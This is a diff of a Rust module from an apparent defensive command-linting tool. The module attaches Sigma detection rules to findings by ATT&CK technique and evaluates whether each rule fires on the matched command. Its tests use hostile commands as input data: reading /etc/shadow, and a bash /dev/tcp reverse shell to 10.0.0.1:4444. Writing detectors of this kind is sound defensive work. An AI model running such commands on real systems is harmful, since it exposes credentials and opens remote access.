@@ -2,9 +2,11 @@
 //!
 //! Point opseclint at a checkout of <https://github.com/SigmaHQ/sigma> (or any
 //! directory of Sigma-format YAML) with `--sigma <DIR>`. We index every rule by
-//! the ATT&CK technique(s) in its `tags`, then attach the genuine rule
-//! title/UUID/level to any finding whose technique matches — replacing the
-//! seed KB's representative detection references with real, linkable rules.
+//! the ATT&CK technique(s) in its `tags` — together with its parsed detection
+//! logic — then attach the genuine rule title/UUID/level to any finding whose
+//! technique matches, and evaluate whether each rule would actually fire on the
+//! matched command (`fires` / `no-fire` / `indeterminate`). The same index
+//! powers coverage-gap analysis.
 //!
 //! The ruleset is read at runtime and never bundled, so the binary stays
 //! self-contained and no detection-rule licensing is redistributed.
@@ -17,38 +19,31 @@ use std::time::UNIX_EPOCH;
 
 use serde::{Deserialize, Serialize};
 
+use crate::kb::Platform;
 use crate::model::{Detection, Report};
 
 /// Maximum real Sigma rules to attach per finding, to keep output readable.
 const MAX_RULES_PER_FINDING: usize = 5;
 
-#[derive(Debug, Deserialize)]
-struct LogSource {
-    product: Option<String>,
-}
+/// Bump when the cached rule shape changes, to invalidate stale cache files.
+const CACHE_VERSION: u32 = 2;
 
-/// The subset of a Sigma rule we care about.
-#[derive(Debug, Deserialize)]
-struct SigmaRuleRaw {
-    title: Option<String>,
-    id: Option<String>,
-    level: Option<String>,
-    #[serde(default)]
-    tags: Vec<String>,
-    logsource: Option<LogSource>,
-}
-
-/// A resolved Sigma rule reference.
+/// A resolved Sigma rule: metadata plus its parsed detection logic (when the
+/// rule could be lowered for evaluation).
 #[derive(Debug, Clone, Serialize, Deserialize)]
 pub struct SigmaRule {
     pub id: String,
     pub title: String,
     pub level: String,
+    #[serde(default)]
+    pub rule: Option<crate::sigma_eval::DetectionRule>,
 }
 
 /// On-disk cache of a parsed ruleset, keyed by a fingerprint of the directory.
 #[derive(Serialize, Deserialize)]
 struct SigmaCache {
+    #[serde(default)]
+    version: u32,
     product: String,
     fingerprint: u64,
     files_scanned: usize,
@@ -124,27 +119,45 @@ impl SigmaIndex {
     fn ingest_file(&mut self, content: &str, product: &str) {
         // A Sigma file may hold multiple YAML documents.
         for doc in serde_yaml::Deserializer::from_str(content) {
-            let Ok(raw) = SigmaRuleRaw::deserialize(doc) else {
+            let Ok(value) = serde_yaml::Value::deserialize(doc) else {
                 continue;
             };
             // Keep platform-relevant rules (matching product or unspecified).
-            if let Some(ls) = &raw.logsource
-                && let Some(rule_product) = &ls.product
-                && !rule_product.eq_ignore_ascii_case(product)
+            if let Some(p) = value
+                .get("logsource")
+                .and_then(|ls| ls.get("product"))
+                .and_then(|p| p.as_str())
+                && !p.eq_ignore_ascii_case(product)
             {
                 continue;
             }
-            let (Some(id), Some(title)) = (raw.id, raw.title) else {
+            let (Some(id), Some(title)) = (
+                value.get("id").and_then(|v| v.as_str()),
+                value.get("title").and_then(|v| v.as_str()),
+            ) else {
                 continue;
             };
-            let level = raw.level.unwrap_or_else(|| "medium".to_string());
+            let level = value
+                .get("level")
+                .and_then(|l| l.as_str())
+                .unwrap_or("medium")
+                .to_string();
+            let detection = crate::sigma_eval::parse_rule_value(&value);
+
             let mut indexed_any = false;
-            for tag in &raw.tags {
+            for tag in value
+                .get("tags")
+                .and_then(|t| t.as_sequence())
+                .into_iter()
+                .flatten()
+                .filter_map(|t| t.as_str())
+            {
                 if let Some(tech) = technique_from_tag(tag) {
                     self.by_technique.entry(tech).or_default().push(SigmaRule {
-                        id: id.clone(),
-                        title: title.clone(),
+                        id: id.to_string(),
+                        title: title.to_string(),
                         level: level.clone(),
+                        rule: detection.clone(),
                     });
                     indexed_any = true;
                 }
@@ -272,6 +285,7 @@ fn load_with_cache(
     let fp = fingerprint(dir, product)?;
     if let Ok(content) = std::fs::read_to_string(path)
         && let Ok(cache) = serde_json::from_str::<SigmaCache>(&content)
+        && cache.version == CACHE_VERSION
         && cache.product == product
         && cache.fingerprint == fp
     {
@@ -280,6 +294,7 @@ fn load_with_cache(
 
     let index = SigmaIndex::load_dir(dir, product)?;
     let cache = SigmaCache {
+        version: CACHE_VERSION,
         product: product.to_string(),
         fingerprint: fp,
         files_scanned: index.files_scanned,
@@ -293,9 +308,10 @@ fn load_with_cache(
 }
 
 /// Replace each finding's representative detections with real Sigma rules where
-/// the technique matches. Findings with no match keep their seed detections.
-/// Returns the number of findings that were enriched.
-pub fn enrich(report: &mut Report, index: &SigmaIndex) -> usize {
+/// the technique matches, annotating each with whether the rule would actually
+/// fire on the matched command. Findings with no match keep their seed
+/// detections. Returns the number of findings that were enriched.
+pub fn enrich(report: &mut Report, index: &SigmaIndex, platform: Platform) -> usize {
     let mut enriched = 0;
     for f in &mut report.findings {
         let tids: Vec<String> = f.techniques.iter().map(|t| t.id.clone()).collect();
@@ -305,10 +321,19 @@ pub fn enrich(report: &mut Report, index: &SigmaIndex) -> usize {
         }
         f.detections = rules
             .into_iter()
-            .map(|r| Detection {
-                source: "Sigma".to_string(),
-                rule: format!("{} ({})", r.title, r.id),
-                confidence: r.level,
+            .map(|r| {
+                let verdict = match (&r.rule, &f.matched_command) {
+                    (Some(dr), Some(cmd)) => Some(verdict_label(&crate::sigma_eval::evaluate(
+                        dr, cmd, platform,
+                    ))),
+                    _ => None,
+                };
+                Detection {
+                    source: "Sigma".to_string(),
+                    rule: format!("{} ({})", r.title, r.id),
+                    confidence: r.level,
+                    verdict,
+                }
             })
             .collect();
         enriched += 1;
@@ -316,108 +341,14 @@ pub fn enrich(report: &mut Report, index: &SigmaIndex) -> usize {
     enriched
 }
 
-// --- detection-logic index (for coverage-gap analysis) --------------------
-
-/// A Sigma rule with parsed detection logic, indexed by technique.
-pub struct DetectionRuleRef {
-    pub id: String,
-    pub title: String,
-    pub rule: crate::sigma_eval::DetectionRule,
-}
-
-/// technique-id -> Sigma rules whose detection logic can be evaluated.
-#[derive(Default)]
-pub struct DetectionIndex {
-    by_technique: HashMap<String, Vec<DetectionRuleRef>>,
-    pub files_scanned: usize,
-    pub rules_indexed: usize,
-}
-
-impl DetectionIndex {
-    /// All rules matching any of the given technique ids, deduped by rule id.
-    pub fn rules_for(&self, technique_ids: &[String]) -> Vec<&DetectionRuleRef> {
-        let mut out: Vec<&DetectionRuleRef> = Vec::new();
-        for tid in technique_ids {
-            if let Some(rules) = self.by_technique.get(tid) {
-                for r in rules {
-                    if !out.iter().any(|e| e.id == r.id) {
-                        out.push(r);
-                    }
-                }
-            }
-        }
-        out
-    }
-
-    /// Recursively load Sigma rules under `dir`, parsing each one's detection
-    /// logic and indexing it by ATT&CK technique. Platform-filtered like
-    /// [`SigmaIndex::load_dir`].
-    pub fn load_dir(dir: &Path, product: &str) -> std::io::Result<DetectionIndex> {
-        let mut index = DetectionIndex::default();
-        let mut stack = vec![dir.to_path_buf()];
-        while let Some(path) = stack.pop() {
-            for entry in std::fs::read_dir(&path)? {
-                let entry = entry?;
-                let p = entry.path();
-                if p.is_dir() {
-                    stack.push(p);
-                    continue;
-                }
-                if !is_yaml(&p) {
-                    continue;
-                }
-                index.files_scanned += 1;
-                if let Ok(content) = std::fs::read_to_string(&p) {
-                    index.ingest(&content, product);
-                }
-            }
-        }
-        Ok(index)
-    }
-
-    fn ingest(&mut self, content: &str, product: &str) {
-        use serde::Deserialize;
-        for doc in serde_yaml::Deserializer::from_str(content) {
-            let Ok(value) = serde_yaml::Value::deserialize(doc) else {
-                continue;
-            };
-            // Platform filter.
-            if let Some(p) = value
-                .get("logsource")
-                .and_then(|ls| ls.get("product"))
-                .and_then(|p| p.as_str())
-                && !p.eq_ignore_ascii_case(product)
-            {
-                continue;
-            }
-            let Some(rule) = crate::sigma_eval::parse_rule_value(&value) else {
-                continue;
-            };
-            let techniques: Vec<String> = value
-                .get("tags")
-                .and_then(|t| t.as_sequence())
-                .map(|seq| {
-                    seq.iter()
-                        .filter_map(|t| t.as_str())
-                        .filter_map(technique_from_tag)
-                        .collect()
-                })
-                .unwrap_or_default();
-            if techniques.is_empty() {
-                continue;
-            }
-            self.rules_indexed += 1;
-            for tech in techniques {
-                self.by_technique
-                    .entry(tech)
-                    .or_default()
-                    .push(DetectionRuleRef {
-                        id: rule.id.clone(),
-                        title: rule.title.clone(),
-                        rule: rule.clone(),
-                    });
-            }
-        }
+/// A short verdict label for a detection line.
+fn verdict_label(v: &crate::sigma_eval::Verdict) -> String {
+    use crate::sigma_eval::Outcome;
+    match v.outcome {
+        Outcome::Fires => "fires".to_string(),
+        Outcome::NoFire => "no-fire".to_string(),
+        Outcome::Indeterminate if v.missing_fields.is_empty() => "indeterminate".to_string(),
+        Outcome::Indeterminate => format!("indeterminate (needs {})", v.missing_fields.join(", ")),
     }
 }
 
@@ -449,7 +380,7 @@ mod tests {
 
         let kb = kb::load(kb::Platform::LinuxAuditd).unwrap();
         let mut report = analyzer::analyze("cat /etc/shadow", &kb);
-        let n = enrich(&mut report, &index);
+        let n = enrich(&mut report, &index, kb::Platform::LinuxAuditd);
         assert!(n >= 1);
 
         let shadow = report
@@ -463,6 +394,26 @@ mod tests {
                 .detections
                 .iter()
                 .any(|d| d.rule.contains("11111111-1111-1111-1111-111111111111"))
+        );
+    }
+
+    #[test]
+    fn enrichment_carries_a_verdict() {
+        let index = SigmaIndex::load_dir(&fixtures(), "linux").expect("fixtures load");
+        let kb = kb::load(kb::Platform::LinuxAuditd).unwrap();
+        // The /dev/tcp fixture rule (CommandLine contains /dev/tcp/) fires.
+        let mut report = analyzer::analyze("bash -i >& /dev/tcp/10.0.0.1/4444 0>&1", &kb);
+        enrich(&mut report, &index, kb::Platform::LinuxAuditd);
+        let f = report
+            .findings
+            .iter()
+            .find(|f| f.rule_id == "reverse-shell-devtcp")
+            .unwrap();
+        assert!(
+            f.detections
+                .iter()
+                .any(|d| d.verdict.as_deref() == Some("fires")),
+            "expected a firing verdict on the enriched detection"
         );
     }
 
@@ -509,6 +460,7 @@ mod tests {
         let cache = std::env::temp_dir().join("opseclint-test-cache-stale.json");
         // A cache with a wrong fingerprint must be ignored (re-parsed).
         let bogus = SigmaCache {
+            version: CACHE_VERSION,
             product: "linux".to_string(),
             fingerprint: 0,
             files_scanned: 0,
